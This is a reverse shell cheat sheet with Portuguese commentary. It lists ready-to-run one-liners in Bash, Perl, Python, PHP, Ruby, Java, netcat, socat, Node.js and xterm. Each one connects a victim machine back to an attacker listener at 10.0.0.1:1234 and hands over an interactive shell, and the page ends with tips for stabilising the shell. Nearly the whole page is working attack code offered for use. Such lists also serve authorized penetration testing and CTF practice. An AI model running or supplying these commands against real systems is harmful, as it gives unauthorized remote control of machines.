# Reverse Shell Cheatsheet

## 🌐 Escutando no atacante

```bash
rlwrap nc -nvlp 1234
```

***

### 🐍 Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```

```bash
0<&196;exec 196<>/dev/tcp/10.0.0.1/1234; sh <&196 >&196 2>&196
```

```bash
exec 5<>/dev/tcp/10.0.0.1/1234;cat <&5 | while read line; do $line 2>&5 >&5; done
```

***

### 💎 Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
open(STDIN,">&S");open(STDOUT,">&S");
open(STDERR,">&S");exec("/bin/sh -i");};'
```

```perl
perl -MIO -e '$p=fork;exit,if($p);
$~->fdopen($_,r),IO::Select->new($_)->can_read and exec"/bin/sh";'
```

***

### 🐍 Python

{% code overflow="wrap" fullWidth="false" %}
```python
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
{% endcode %}

Python3 equivalente:

```python
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
```

***

### 💻 PHP

```php
php -r '$sock=fsockopen("10.0.0.1",1234);
exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
php -r '$sock=fsockopen("10.0.0.1",1234);
$p=proc_open("/bin/sh -i", [0=>$sock, 1=>$sock, 2=>$sock], $pipes);'
```

***

### 💭 Ruby

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","1234");
while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

***

### ☕ Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/1234;
cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

***

### 🐚 Netcat (tradicional)

```bash
nc -e /bin/sh 10.0.0.1 1234
```

```bash
/bin/sh | nc 10.0.0.1 1234
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc 10.0.0.1 1234 0</tmp/p | /bin/sh >/tmp/p 2>&1
```

***

### 🆕 Netcat (Ncat do Nmap)

```bash
ncat 10.0.0.1 1234 -e /bin/bash
```

***

### 🧼 Socat

Na máquina do atacante (escutando):

```bash
socat file:`tty`,raw,echo=0 tcp-listen:1234
```

Na máquina vítima (conectar de volta):

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:1234
```

***

### 📦 JavaScript (Node.js)

```js
require('child_process').exec('nc 10.0.0.1 1234 -e /bin/sh')
```

***

### ⛓ Xterm

No atacante:

```bash
xhost +targetip
```

Na vítima:

```bash
xterm -display attackerip:1
```

***

### 🧪 Diagnóstico: qual shell consegui?

Se estiver com shell interativo ruim (sem autocompletar, etc), use:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Ou tente:

```bash
script /dev/null -c bash
```

***

### 🧠 Dica para tornar o shell mais estável

Depois de usar `pty.spawn`, pressione:

* `Ctrl+Z`
* No shell local: `stty raw -echo; fg`
* Depois pressione `Enter` duas vezes

